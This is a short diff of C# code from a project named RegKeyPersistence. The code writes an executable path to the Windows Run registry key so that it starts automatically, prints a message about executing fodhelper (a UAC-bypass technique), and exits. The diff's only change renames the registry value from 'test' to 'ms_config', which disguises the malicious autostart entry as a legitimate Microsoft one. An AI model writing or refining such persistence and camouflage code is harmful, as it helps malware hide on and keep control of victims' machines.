@@ -42,7 +42,7 @@ namespace RegKeyPersistence
                     rk = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                 else
                     rk = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
-                rk.SetValue("test", fileName, RegistryValueKind.String);
+                rk.SetValue("ms_config", fileName, RegistryValueKind.String);
                 Debug.WriteLine($"Executing fodhelper!");
                 rk.Close();
                 Environment.Exit(0);
